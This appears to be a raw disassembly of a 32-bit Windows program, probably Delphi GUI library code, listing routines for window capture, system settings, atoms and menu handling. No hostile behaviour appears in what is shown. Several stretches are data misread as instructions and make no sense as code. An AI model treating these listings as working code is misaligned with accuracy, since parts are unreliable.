call sub_43fbc0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_43fb68
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_43fb98
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_40688c
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_43fbc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43fb34
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_43fbe8
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_43fb4c
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_43fb68
pop ebx
retn
mov eax ebx
call sub_43fb98
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_43fc4c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fdb2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_43fed0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_43feb4
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_43feb4
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_43ffc0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4030f8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4030f8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4030f8
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4030f8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eb4
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eb4
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_440048
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4401c0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408aac
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f08
mov eax [ rw-data ]
call sub_404374
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408aac
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f08
mov eax [ rw-data ]
call sub_404374
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404374
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c9c
mov [ rw-data ] eax
call sub_43fc4c
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fa74
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_451d04
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_452de8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_4549d0
mov ecx r-xdata
mov edx sub_431ba0
mov eax [ r-xdata ]
call sub_4133bc
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4401c7
lea eax [ ebp - 0x10 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_440212
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440273
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44027a
retn
mov eax rw-data
call sub_40cc80
call sub_43ffc0
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404930
mov eax rw-data
call sub_403eb4
mov eax rw-data
call sub_403eb4
sub_44027c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440302
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440309
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_440048
mov eax [ r-xdata ]
call sub_413230
mov eax [ r-xdata ]
call sub_4132d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
sub_4404fc
stc
push ebx
push eax
[ ebx + ecx ]
inc esp
add [ ebx + ecx + 0x44 ] ah
add [ eax + 0xd ] ch
inc esp
add [ eax + 0x1100440d ] cl
push esp
inc ebx
jne r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
and [ ecx + eax * 2 ] dl
adc [ ecx + 0x41 ] al
add ah dh
dec eax
inc ecx
je r-xdata
add [ eax + esi + 0xef40040 ] ch
inc ebx
jne r-xdata
cmp al 0x33
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc esp
add [ edi + ecx + 0x44 ] al
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc eax
add ah dh
push cs
dec esp
imul esi [ ebx + 0x74 ] 0x648c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add ah ch
inc edi
inc ecx
add al cl
push esi
inc ecx
add ah bh
push esi
inc ecx
add [ eax ] al
push edi
inc ecx
add [ edi + edx * 2 ] al
inc ecx
add al bl
dec ebx
inc ecx
add [ eax + 0x58 ] bh
inc ecx
add ah dl
pop eax
inc ecx
add [ eax - 0x67ffbea7 ] ch
push edx
inc ecx
add ah ah
pop ecx
inc ecx
add [ eax + 0x5a ] bl
inc ecx
add [ eax ] bl
adc eax 0x54880044
inc ecx
add [ edi + eax * 2 ] dh
inc ecx
add [ edx * 2 + 0x55640041 ] ah
inc ecx
add al dl
push ebp
inc ecx
add [ ebx + ecx * 2 + 0x57600041 ] al
inc ecx
add [ ebp + ecx * 2 + 0x4e600041 ] cl
inc ecx
add [ edi + edx * 2 + 0x57ac0041 ] bl
inc ecx
add ah al
dec esi
inc ecx
add [ eax ] bl
dec edi
inc ecx
add ah al
dec edi
inc ecx
add [ ecx + edx * 2 + 0x41 ] bl
add [ ecx + edx * 2 + 0x52480041 ] dh
inc ecx
add ah ch
push esp
inc ecx
add [ eax ] cl
push ebp
inc ecx
add [ eax ] al
pop eax
inc ecx
add [ eax + 0x56 ] dl
inc ecx
add [ eax ] dl
pop edx
inc ecx
add [ eax ] ah
pop edx
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov esp 0x2004123
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x59c0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax ] dh
inc esp
add [ eax ] dh
add [ eax ] al
add [ edx + ebx + 0x41 ] cl
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
inc ecx
sub al 0xa1
inc ebx
jne r-xdata
add [ eax - 0x4bffbe5a ] cl
or [ eax + eax + 0x10 ] al
adc al 0x44
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0x4800440e ] ah
cmpsd [ esi ] [ edi ]
inc ecx
add ah ch
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x4fffbe5a ] al
cmpsb [ esi ] [ edi ]
inc ecx
add [ esi + 0xa080041 ] al
inc esp
add [ eax ] bh
adc al [ eax + eax - 0x30 ]
adc [ eax + eax + 0xc ] eax
adc eax 0xe0044
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
add [ eax + edx + 0x780040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp al 0x1b
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x6b80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax ] cl
inc esp
add [ eax + 0x7 ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
pop es
inc esp
add [ edi + eax ] bh
inc esp
add [ eax + 0xc000000 ] ah
add eax [ eax + eax + 0x4c ]
movsb [ edi ] [ esi ]
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
hlt
sub_440732
out dx eax
[ esp + edx + 0x44 ]
add [ esp + edx + 0x540d0044 ] al
inc ebx
jne r-xdata
nop
xor [ eax ] al
lodsb [ esi ]
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a628
test bl bl
jle r-xdata
mov edx esi
call sub_440c58
xor [ eax ] al
cmp [ ebp - 0x5acbffbf ] ah
inc ecx
add [ ebp + 0x41 ] ch
inc eax
add [ eax - 0x53ffbfd0 ] dl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
push eax
pop es
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
add ah cl
movsd [ edi ] [ esi ]
inc ecx
add [ eax - 0x2fffbe5b ] ah
movsd [ edi ] [ esi ]
inc ecx
add al dh
movsb [ edi ] [ esi ]
inc ecx
add [ ebp - 0x5a27ffbf ] al
inc ecx
add [ eax - 0x43ffbbf3 ] ch
or eax 0xdd00044
inc esp
add ah ah
or eax 0xdf80044
inc esp
add [ esi + ecx ] cl
inc esp
add [ eax ] ah
push cs
inc esp
add [ esi + ecx ] dh
inc esp
add [ eax + 0xe ] cl
inc esp
add [ esi + ecx + 0x44 ] bl
add [ eax + 0xe ] dh
inc esp
add [ esi + ecx + 0x44 ] dh
add [ eax + 0xe ] bh
inc esp
add [ esi + ecx + 0x44 ] bh
add [ eax - 0x7bffbbf2 ] al
push cs
inc esp
add [ eax - 0x73ffbbf2 ] cl
push cs
inc esp
add [ eax - 0x6bffbbf2 ] dl
push cs
inc esp
add [ eax - 0x63ffbbf2 ] bl
push cs
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x21e85653
sub al 0xfc
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax 0xe0004406
add eax [ eax + eax + 0x3 ]
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x7c00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
or [ eax + eax + 0x18 ] al
add [ eax ] al
add [ eax ] ah
and al 0x41
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
sub_440844
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a628
test bl bl
jle r-xdata
mov edx esi
call sub_440c58
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4408b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a13c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44095c
sub_4408e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_440878
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4138e4
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413a70
sub_440930
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4042c0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f08
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44095c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_440c58
mov edx ebx
mov eax esi
call sub_440c38
sub_440984
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44095c
sub_4409b0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45574c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4032f4
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a6b4
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_4319cc
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440a08
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_455774
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4032f4
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a6d0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_4319cc
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440a60
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419cdc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_440be4
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_440acc
push ebx
push esi
push edi
call sub_40346c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4030f8
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413adc
call sub_4030f8
mov eax [ edi + 0x30 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419d28
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403454
sub_440b1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_440b64
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413a50
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov edx edi
call sub_4408e8
sub_440bb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_4423b4
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_4423f8
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419dac
sub_440bf0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419ff8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_440c58
sub_440c38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413898
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419dac
pop esi
pop ebx
retn
sub_440c58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413b90
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_440c74
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_440cdc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_44b624
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_443c50
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4414e4
mov edx ebp
call sub_441544
inc eax
je r-xdata
sub_440d68
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_440d88
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_440ea0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a5e4
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_440ef4
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4030f8
mov eax [ esi + 0x9c ]
call sub_4030f8
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440844
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cc80
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_440f44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414110
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_440ff0
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_441050
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_441158
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_441290
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4412f0
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44134c
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_4413b0
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440ff0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4042c0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
sub_441050
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_441148
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
